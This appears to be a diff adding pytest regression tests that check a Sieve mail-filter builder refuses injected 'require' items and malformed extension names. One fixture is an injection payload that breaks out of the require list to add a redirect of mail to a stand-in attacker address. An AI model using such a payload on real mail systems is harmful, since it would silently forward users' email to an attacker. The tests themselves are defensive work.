@@ -605,3 +605,53 @@ def test_a_nul_anywhere_in_a_rules_span_is_refused(label: str, text: str):
     assert isinstance(script.entries[0], st.Rule), "premise: this lexes to a Rule"
     assert st.span_is_faithful(script.entries[0]), "premise: the span vouches for itself"
     assert st.preflight_error(script) is not None
+
+
+# ── The reference the checking was done with ──
+
+
+_REQUIRE_SMUGGLED = 'fileinto"];\nredirect "atk@e.com";\n#'
+
+
+def test_a_require_item_that_closes_its_own_quote_is_refused():
+    """The one client-supplied string the design never thought to check, because
+    it is what checking is done WITH: `_boundary_error` holds the head bytes up
+    against `script.requires`, so `requires` read as the trusted reference rather
+    than as input. `_requires_text` interpolated each item into
+    `require ["..."];` unescaped, so an item could close the quote and the
+    bracket and write a statement of its own.
+
+    Worse than the two findings before it, not better: no RawBlock, no `source`,
+    NO ENTRIES AT ALL — so the ADR-0002 "that channel grants arbitrary statements
+    anyway" argument that capped those does not apply here. This is the original
+    Task 7 bug — hostile bytes, no entries, 200 — one field along.
+    """
+    script = st.SieveScript(requires=[_REQUIRE_SMUGGLED], entries=[])
+    assert st.preflight_error(script) is not None
+
+
+def test_an_extension_name_with_a_trailing_newline_is_refused():
+    """Found by the fuzzer against the FIRST version of this guard. Python's `$`
+    also matches before a trailing newline, so an anchored `match` accepted
+    `"elsif\\n"` and rendered `require ["elsif` and `"];` on two lines. The check
+    is a `fullmatch` for that reason."""
+    assert st.preflight_error(st.SieveScript(requires=["elsif\n"])) is not None
+
+
+@pytest.mark.parametrize(
+    "extension",
+    ["fileinto", "vacation-seconds", "imap4flags", "vnd.dovecot.duplicate", "regex"],
+)
+def test_a_well_formed_extension_name_is_not_refused(extension: str):
+    """The check is a SHAPE, not a list of names, so an extension nobody here has
+    heard of still saves — `vnd.dovecot.duplicate` is in none of our fixtures.
+    A list of known names would be the `.13` lockout wearing a new hat."""
+    assert st.preflight_error(st.SieveScript(requires=[extension])) is None
+
+
+def test_the_endpoint_rejects_a_smuggled_require_item_without_writing(authed_client):
+    store = FakeScriptStore({"primary": "keep;\n"})
+    with authed_client(script_store=store) as http:
+        r = _put(http, requires=[_REQUIRE_SMUGGLED])
+    assert r.status_code == 400, r.text
+    assert store.scripts == {"primary": "keep;\n"}, "the real script must be untouched"
